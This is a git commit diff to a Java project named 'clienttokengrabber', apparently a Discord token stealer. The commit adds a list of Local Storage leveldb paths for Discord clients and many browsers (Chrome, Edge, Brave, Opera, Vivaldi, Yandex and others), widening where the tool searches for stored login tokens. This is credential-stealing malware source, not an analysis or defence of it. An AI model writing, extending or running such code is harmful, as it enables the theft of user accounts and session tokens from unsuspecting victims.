8ee88500939a24febfb49f2aaf231300a424d8f1
Under <5d0@tutanota.com>
2023-09-01 02:37:37 +0300

    Expanded browser support

--- src/main/java/clienttokengrabber/utils/PathHelper.java
+++ src/main/java/clienttokengrabber/utils/PathHelper.java
@@ -13,15 +13,31 @@ public class PathHelper {
     private static List<String> browserPaths = new ArrayList<>();
 
     public static List<String> loadClientPaths() {
-        addPath(clientPaths, ROAMING, "discord");
-        addPath(clientPaths, ROAMING, "discordcanary");
-        addPath(clientPaths, ROAMING, "discordptb");
+        addPath(clientPaths, ROAMING, "discord");           // Discord
+        addPath(clientPaths, ROAMING, "discordcanary");     // Discord Canary
+        addPath(clientPaths, ROAMING, "discordptb");        // Discord PTB
 
         return clientPaths;
     }
 
     public static List<String> loadBrowserPaths() {
-        addPath(browserPaths, LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");
+        addPath(browserPaths, LOCAL, "Chromium", "User Data", "Default", "Local Storage", "leveldb");                               // Ungoogled Chromium
+        addPath(browserPaths, LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");                       // Google Chrome
+        addPath(browserPaths, LOCAL, "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb");                  // Google Chrome Beta
+        addPath(browserPaths, LOCAL, "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Dev
+        addPath(browserPaths, LOCAL, "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Canary
+        addPath(browserPaths, LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb");                      // Microsoft Edge
+        addPath(browserPaths, LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb");         // Brave
+        addPath(browserPaths, LOCAL, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb");                                // Vivaldi
+        addPath(browserPaths, ROAMING, "Opera Software", "Opera Stable", "Local Storage", "leveldb");                               // Opera
+        addPath(browserPaths, ROAMING, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb");                            // Opera GX
+        addPath(browserPaths, ROAMING, "Opera Software", "Opera GX", "Local Storage", "leveldb");                                   // Opera GX Legacy
+        addPath(browserPaths, ROAMING, "Opera Software", "Opera Next", "Default", "Local Storage", "leveldb");                      // Opera Beta
+        addPath(browserPaths, ROAMING, "Opera Software", "Opera Developer", "Default", "Local Storage", "leveldb");                 // Opera Developer
+        addPath(browserPaths, LOCAL, "Iridium", "User Data", "Default", "Local Storage", "leveldb");                                // Iridium
+        addPath(browserPaths, LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");                   // Epic Privacy Browser
+        addPath(browserPaths, LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");                                  // Falkon
+        addPath(browserPaths, LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");                // Yandex
 
         return browserPaths;
     }
